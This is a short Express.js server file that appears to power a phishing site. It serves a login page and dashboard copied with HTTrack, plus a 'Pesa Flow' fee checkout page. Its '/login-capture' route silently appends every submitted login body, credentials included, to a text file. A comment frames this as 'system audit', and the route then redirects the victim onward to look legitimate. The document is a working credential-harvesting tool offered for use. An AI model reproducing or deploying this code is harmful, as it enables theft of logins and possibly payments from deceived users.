const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

/**
 * 🛠️ CORE CONFIGURATION
 */
// Dynamic Port for Render Deployment (defaults to 3000 locally)
const PORT = process.env.PORT || 3000;

// Middleware to serve CSS/JS/Images from HTTrack folders
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

/**
 * 🧠 CAPTURE ENGINE
 * Logs credentials to a file so they aren't lost if the terminal clears.
 */
app.post('/login-capture', (req, res) => {
    const logData = `[${new Date().toISOString()}] Login Attempt: ${JSON.stringify(req.body)}\n`;
    
    // Silent logging for system audit
    fs.appendFileSync('audit_log.txt', logData);
    
    console.log("✅ SYSTEM_INTELLIGENCE: Data Captured Successfully.");
    res.redirect('/Dashboard');
});

/**
 * 📡 NAVIGATION HUB
 */

// Landing (Original HTTrack Login)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Professional Dashboard (Original Source)
app.get('/Dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Pesa Flow Checkout (Our Dedicated Build)
app.get('/pay-fees', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'checkout.html'));
});

/**
 * ⚛️ QUANTUM FALLBACK
 * Prevents "File Not Found" errors by redirecting unknown routes back home.
 */
app.use((req, res) => {
    res.status(404).redirect('/');
});

app.listen(PORT, () => {
    console.log(`🚀 OMNI-VITA CORE: Operational on Port ${PORT}`);
    console.log(`🔗 Local Access: http://localhost:${PORT}`);
});
